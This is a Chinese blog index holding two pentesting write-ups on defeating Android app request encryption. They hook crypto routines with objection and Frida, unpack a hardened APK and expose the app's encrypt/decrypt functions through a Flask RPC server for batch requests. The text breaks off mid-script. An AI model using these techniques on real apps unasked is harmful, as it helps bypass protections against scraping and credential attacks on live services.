<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>某保险APP加解密算法逆向</title>
      <link href="/2024/10/10/%E6%9F%90%E4%BF%9D%E9%99%A9APP%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/"/>
      <url>/2024/10/10/%E6%9F%90%E4%BF%9D%E9%99%A9APP%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本节分析的是之前渗透时的一个APP，抓包后发现请求包和返回包都做了加密。</p><p>此处分析某保险的APP，具体分析情况如下：</p><p>开整开整开整~</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>目标接口：<a href="https://xxx.xxx.xxx/login.do">https://xxx.xxx.xxx/login.do</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121243.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121584.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121447.png" alt="image.png"> </p><p>发现请求包和响应包的内容都是直接加密的，也没有什么提示信息，什么玩意？？？</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>1、首先，查壳，未发现壳</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121201.png" alt="image.png"> </p><p>2、将apk拖入到jadx中，搜索一些关键字符。如”encrypt”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122575.png" alt="image.png"> </p><p>发现在<code>com.xxxx.core_library.util.encrypt</code>这个package下，有AES和RSA的加密算法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122490.png" alt="image.png"> </p><p>查看相关代码后发现，疑似的关键代码是在<code>AESUtil</code>和 <code>RSAUtils</code>这两个类中的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122103.png" alt="image.png"> </p><p>但具体加密逻辑是什么暂时不清楚。</p><p>3、这时候，可以用hook的神器<code>objection</code>来对这两个类下的所有方法hook，查看其加解密逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.xxx.core_library.util.encrypt.AESUtil</span><br><span class="line">android hooking watch class com.xxx.core_library.util.encrypt.RSAUtils</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121123770.png" alt="image-20241012112328744"> </p><p>4、点击登录，抓包，查看hook情况，如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121123594.png" alt="image.png"> </p><p>整理一下，调用的函数有（按照调用顺序如下）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AESUtil.encrypt(java.lang.String)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">RSAUtils.actRsaPubkeyEncry(java.lang.String)</span><br><span class="line">RSAUtils.decryptByPublicKey([B, java.lang.String)</span><br><span class="line">RSAUtils.Base64Decode(java.lang.String)</span><br><span class="line">AESUtil.decrypt([B, java.lang.String)</span><br><span class="line">AESUtil.makeKey(java.lang.String)    </span><br><span class="line">AESUtil.makeIv()</span><br></pre></td></tr></table></figure><p>整理去重后，主要是有以下几个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AESUtil.encrypt</span><br><span class="line">AESUtil.makeKey</span><br><span class="line">AESUtil.makeIv</span><br><span class="line">AESUtil.decrypt</span><br><span class="line">RSAUtils.actRsaPubkeyEncry</span><br><span class="line">RSAUtils.decryptByPublicKey</span><br><span class="line">RSAUtils.Base64Decode</span><br><span class="line">RSAUtils.actResPubkeyDes</span><br></pre></td></tr></table></figure><p>先看加密，根据函数名，可以看到重要的函数起始就值有2个<code>AESUtil.encrypt</code>和 <code>RSAUtils.actRsaPubkeyEncry</code></p><p>5、hook这两个关键函数（这块不用关注重载的情况，因为Objection默认hook一个函数是hook该函数的所有重载的）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.xxx.core_library.util.encrypt.AESUtil.encrypt --dump-args --dump-return --dump-backtrace</span><br><span class="line">android hooking watch class_method com.xxx.core_library.util.encrypt.RSAUtils.actRsaPubkeyEncry --dump-args --dump-return --dump-backtrace </span><br></pre></td></tr></table></figure><p>对比抓包获取的密文内容，可以成功定位到具体的加密函数<code>RSAUtils.actRsaPubkeyEncry</code>：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121125089.png" alt="image-20241012112515001"> </p><p>同理，利用如上方法，可以定位到具体解密函数为 <code>RSAUtils.actResPubkeyDes</code>:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121125573.png" alt="image-20241012112545525"> </p><p>6、Frida编写脚本hook这两个函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        <span class="comment">//加密函数</span></span><br><span class="line">        claz.<span class="property">actRsaPubkeyEncry</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&#x27;actRsaPubkeyEncry&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actRsaPubkeyEncry input: &quot;</span> + str);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">actRsaPubkeyEncry</span>(str);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actRsaPubkeyEncry result: &quot;</span> + result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解密函数</span></span><br><span class="line">        claz.<span class="property">actResPubkeyDes</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&#x27;actResPubkeyDes&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actResPubkeyDes input: &quot;</span> + str);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">actResPubkeyDes</span>(str);</span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actResPubkeyDes result: &quot;</span> + result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126659.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126147.png" alt="image.png"> </p><h1 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h1><h2 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h2><p>JS代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        result = claz.<span class="title function_">actRsaPubkeyEncry</span>(data)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        result = claz.<span class="title function_">actResPubkeyDes</span>(data)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出接口</span></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">encrypt</span>: encrypt,</span><br><span class="line">    <span class="attr">decrypt</span>: decrypt</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126848.png" alt="img"> </p><p>Python实现主动调用：</p><p>Python实现主动调用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] ==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备工作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有线连接</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;127.0.0.1:27042&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.xxx.xxxx&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载JS脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rpc.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载脚本并定义消息处理函数</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以通过 RPC 调用定义的函数</span></span><br><span class="line">result = script.exports.encrypt(<span class="string">&#x27;&#123;&quot;clientId&quot;:&quot;65l2f2f0an526tc&quot;,&quot;imgCode&quot;:&quot;1234&quot;,&quot;model&quot;:&quot;SM-G988N&quot;,&quot;password&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;phone&quot;:&quot;13888888888&quot;,&quot;phoneId&quot;:&quot;08:00:27:51:bf:b2&quot;,&quot;runEnvironment&quot;:&quot;2&quot;,&quot;system&quot;:&quot;android&quot;,&quot;systemversion&quot;:&quot;9&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127532.png" alt="img"></p><h2 id="批量RPC"><a href="#批量RPC" class="headerlink" title="批量RPC"></a>批量RPC</h2><p>基于flask，创建对外接口，实现POST传参调用接口，最后实现批量化主动调用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] ==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备工作</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;127.0.0.1:27042&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.xxx.xxx&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载JS脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rpc.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载脚本并定义消息处理函数</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    result = script.exports.encrypt(<span class="built_in">str</span>(json_data))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    string_data = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    result = script.exports.decrypt(string_data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>加密接口调用：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127463.png" alt="img"> </p><p>解密接口调用：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127040.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida_rpc算法转发实战</title>
      <link href="/2024/10/09/frida-rpc%E7%AE%97%E6%B3%95%E8%BD%AC%E5%8F%91%E5%AE%9E%E6%88%98/"/>
      <url>/2024/10/09/frida-rpc%E7%AE%97%E6%B3%95%E8%BD%AC%E5%8F%91%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么要使用rpc进行转发？？？</p><p>现在开发app主流的方案是Java，一些中大厂app是Java+C++，C++最后生成的是so，是arm汇编。</p><p>一般分析arm汇编才是最难的，所以中大厂会更倾向把重要加密放在so中，来增强爬虫或者破解的难度！！！</p><p>但是如果使用rpc的话，你就不太需要分析繁琐的Java层和so层的加密了！</p><p>只需要找到特定的加解密函数和算法，然后frida主动调用java层或so层的方法，拿到加密前后的内容即可！</p><h1 id="rpc转发案例"><a href="#rpc转发案例" class="headerlink" title="rpc转发案例"></a>rpc转发案例</h1><p>本次使用的app是嘟嘟牛，下载地址如下：</p><p><a href="http://www.downcc.com/soft/144510.html">嘟嘟牛在线app下载-嘟嘟牛在线充值下载v4.50 安卓版-绿色资源网 (downcc.com)</a></p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>通过抓包登录接口发现，走的是<code>http://api.dodovip.com/api/user/login</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410100950041.png" alt="image-20241010095033975"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410100951047.png" alt="image-20241010095108007"> </p><p>提交的请求头是一个<code>&#123;Encrypt:xxxx&#125;</code>，这？？？</p><p>这块作为平常的渗透或者进一步分析肯定是不行的，所以需要找一下参数 <code>Encrypt</code> 的生成逻辑。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1、直接将app拖入jadx中，查看，发现在<code>AndroidManifest.xml</code>文件中声明的Activity在源代码中找不到。如 <code>com.dodonew.online.ui.StartActivity</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101037539.png" alt="image-20241010103728503"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101040923.png" alt="image-20241010104008891"> </p><p>2、这样看应该是有做加壳，查壳工具检测，发现使用了《360加固》</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101043038.png" alt="image-20241010104333008"> </p><p>3、脱壳，直接将app拖进在线网站</p><p>网址：<strong><a href="https://nop.gs/">https://nop.gs</a></strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101046840.png" alt="image-20241010104657789"> </p><p>等上大概几分钟，就会脱好了，直接下载下来就行：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101047039.png" alt="image-20241010104743014"> </p><p>4、将得到的dex文件，拖入到jadx中。搜索关键字 <code>Encrypt</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101053416.png" alt="image-20241010105325361"> </p><p>找到对应的加密逻辑位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101104504.png" alt="image-20241010110419470">  </p><p>可以看到这块使用的是DES加解密，加密函数为<code>RequestUtil.encodeDesMap</code></p><p>5、Objection对该方法直接hook，查看参数、返回值和调用栈</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.dodonew.online.http.RequestUtil.encodeDesMap  --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101430415.png" alt="image-20241010143012184"> </p><p>6、Frida简单写一下hook代码，如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printMap2</span>(<span class="params">map</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">cast</span>(map, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密函数</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">data,desKey,desIV</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil encodeDesMap is call&quot;</span>)</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;RequestUtil encodeDesMap&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey:&quot;</span>,desKey)<span class="comment">//65102933</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV:&quot;</span>,desIV)<span class="comment">//32028092</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(data, desKey, desIV)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil encodeDesMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">paraMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.util.Map&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">addMap,append,sign</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil paraMap is call&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addMap:&quot;</span>,addMap)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addMap:&quot;</span>,<span class="title function_">printMap2</span>(addMap))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;append:&quot;</span>,append)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sign:&quot;</span>,sign)</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">paraMap</span>(addMap, append, sign)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil paraMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解密函数</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">decodeDesJson</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">data,desKey,desIV</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil decodeDesMap is call&quot;</span>)</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;RequestUtil decodeDesMap&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey:&quot;</span>,desKey)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV:&quot;</span>,desIV)</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeDesJson</span>(data, desKey, desIV)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil decodeDesMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101433071.png" alt="image-20241010143305021"> </p><h2 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h2><p>根据上面分析的结果，可以整理出主动调用应该是这样调用的，一个加密，一个解密。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//请求加密</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callparaMap</span>(<span class="params">username, userPwd, timeStamp</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> map = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>).$new();</span><br><span class="line">        map.<span class="title function_">put</span>(<span class="string">&quot;timeStamp&quot;</span>, timeStamp)</span><br><span class="line">        map.<span class="title function_">put</span>(<span class="string">&quot;loginImei&quot;</span>, <span class="string">&quot;Androidnull&quot;</span>)</span><br><span class="line">        map.<span class="title function_">put</span>(<span class="string">&quot;equtype&quot;</span>, <span class="string">&quot;ANDROID&quot;</span>)</span><br><span class="line">        map.<span class="title function_">put</span>(<span class="string">&quot;userPwd&quot;</span>, userPwd)</span><br><span class="line">        map.<span class="title function_">put</span>(<span class="string">&quot;username&quot;</span>, username)</span><br><span 